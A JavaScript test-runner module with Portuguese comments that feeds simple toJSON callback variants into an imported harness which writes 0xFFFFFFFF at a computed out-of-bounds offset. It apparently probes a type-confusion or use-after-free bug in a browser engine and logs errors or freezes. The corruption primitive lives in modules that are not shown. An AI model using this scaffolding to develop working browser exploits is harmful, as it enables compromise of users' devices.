// js/script3/runAllAdvancedTestsS3.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
import { getOutputAdvancedS3, getRunBtnAdvancedS3 } from '../dom_elements.mjs';
import { executeFocusedTestForTypeError, current_toJSON_call_count_for_TypeError_test } from './testJsonTypeConfusionUAFSpeculative.mjs';
import { OOB_CONFIG } from '../config.mjs'; // Importado para toJSON_ReadGlobalOnly
import { toHex } from '../utils.mjs';     

// --- Funções toJSON para teste de decomposição ultra-minimalista e diagnóstico ---

// Variante V0 (Controle - Passa): Absolutamente Mínima
function toJSON_Decomp_V0_ReturnEmptyObject() {
    // Nenhuma operação interna que possa causar TypeError.
    // current_toJSON_call_count_for_TypeError_test não é incrementado aqui.
    return { payloadV0: "V0_empty_object_returned" }; 
}

// Variante X.1 (Novo Teste): Tenta apenas LER uma variável global
function toJSON_ReadGlobalOnly() {
    // current_toJSON_call_count_for_TypeError_test não é incrementado aqui para isolar a leitura.
    let read_value = "N/A";
    let error_reading = null;
    try {
        read_value = OOB_CONFIG.ALLOCATION_SIZE; // Tenta ler uma config global
    } catch (e) {
        error_reading = e.name + ": " + e.message;
    }
    return { payloadX1: "X1_read_global", value: read_value, error: error_reading };
}

// Variante X.2 (Novo Teste): Tenta apenas CHAMAR uma função global pura
function toJSON_CallGlobalMath() {
    // current_toJSON_call_count_for_TypeError_test não é incrementado aqui.
    let math_result = "N/A";
    let error_calling = null;
    try {
        math_result = Math.abs(-5); // Chama uma função global "segura"
    } catch (e) {
        error_calling = e.name + ": " + e.message;
    }
    return { payloadX2: "X2_call_global_math", result: math_result, error: error_calling };
}

// Variante V2 (Controle - Falha): Apenas incrementa o contador global.
function toJSON_Decomp_V2_GlobalCounterOnly() {
    current_toJSON_call_count_for_TypeError_test++; // << PONTO DE FALHA ANTERIOR
    return { payloadV2: "V2_global_counter_incremented", call: current_toJSON_call_count_for_TypeError_test };
}


async function runUltraMinimalDiagnosticTests() {
    const FNAME_RUNNER = "runUltraMinimalDiagnosticTests";
    logS3(`==== INICIANDO Testes de Diagnóstico Ultra-Minimalista para TypeError ====`, 'test', FNAME_RUNNER);

    const tests = [
        { description: "Decomp_V0_ReturnEmptyObject (Controle PASSA)", func: toJSON_Decomp_V0_ReturnEmptyObject },
        { description: "Diagnostic_X1_ReadGlobalOnly", func: toJSON_ReadGlobalOnly },
        { description: "Diagnostic_X2_CallGlobalMath", func: toJSON_CallGlobalMath },
        { description: "Decomp_V2_GlobalCounterOnly (Controle FALHA)", func: toJSON_Decomp_V2_GlobalCounterOnly },
    ];

    const valueForCorruption = 0xFFFFFFFF;
    const criticalOffset = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70

    for (const test of tests) {
        logS3(`\n--- Testando Variante toJSON: ${test.description} ---`, 'subtest', FNAME_RUNNER);
        document.title = `Iniciando SubTeste: ${test.description}`; 
        
        // current_toJSON_call_count_for_TypeError_test é resetado dentro de executeFocusedTestForTypeError
        const result = await executeFocusedTestForTypeError(
            test.description,
            test.func,
            valueForCorruption,
            criticalOffset
        );
        
        if (result.errorOccurred) {
            logS3(`   RESULTADO ${test.description}: ERRO JS CAPTURADO: ${result.errorOccurred.name} - ${result.errorOccurred.message}. Chamadas toJSON (se aplicável): ${result.calls}`, "error", FNAME_RUNNER);
        } else if (result.potentiallyCrashed) {
            logS3(`   RESULTADO ${test.description}: CONGELAMENTO POTENCIAL. Chamadas toJSON (se aplicável): ${result.calls}`, "error", FNAME_RUNNER);
        } else {
            logS3(`   RESULTADO ${test.description}: Completou sem erro explícito no stringify. Chamadas toJSON (se aplicável): ${result.calls}`, "good", FNAME_RUNNER);
            logS3(`      Resultado da toJSON (stringifyResult): ${result.stringifyResult ? JSON.stringify(result.stringifyResult) : 'N/A'}`, "info", FNAME_RUNNER);
        }
        logS3(`   Título da página ao final de ${test.description}: ${document.title}`, "info");
        await PAUSE_S3(MEDIUM_PAUSE_S3);

        if (document.title.startsWith("CONGELOU?")) {
            logS3("Congelamento detectado, interrompendo próximos testes de diagnóstico.", "error", FNAME_RUNNER);
            break;
        }
    }

    logS3(`==== Testes de Diagnóstico Ultra-Minimalista para TypeError CONCLUÍDOS ====`, 'test', FNAME_RUNNER);
}

export async function runAllAdvancedTestsS3() {
    const FNAME = 'runAllAdvancedTestsS3_UltraMinimalDiagnostics';
    const runBtn = getRunBtnAdvancedS3();
    const outputDiv = getOutputAdvancedS3();

    if (runBtn) runBtn.disabled = true;
    if (outputDiv) outputDiv.innerHTML = '';

    logS3(`==== INICIANDO Script 3: Diagnóstico Ultra-Minimalista do Gatilho do TypeError ====`,'test', FNAME);
    document.title = "Iniciando Script 3 - Diagnóstico UltraMinimal";
    
    await runUltraMinimalDiagnosticTests();
    
    logS3(`\n==== Script 3 CONCLUÍDO (Diagnóstico Ultra-Minimalista do TypeError) ====`,'test', FNAME);
    if (runBtn) runBtn.disabled = false;
    
    if (document.title.startsWith("Iniciando") || document.title.startsWith("CONGELOU?")) {
        // Manter
    } else if (document.title.includes("ERRO")) {
        // Manter título de erro
    }
    else {
        document.title = "Script 3 Concluído - Diagnóstico UltraMinimal";
    }
}
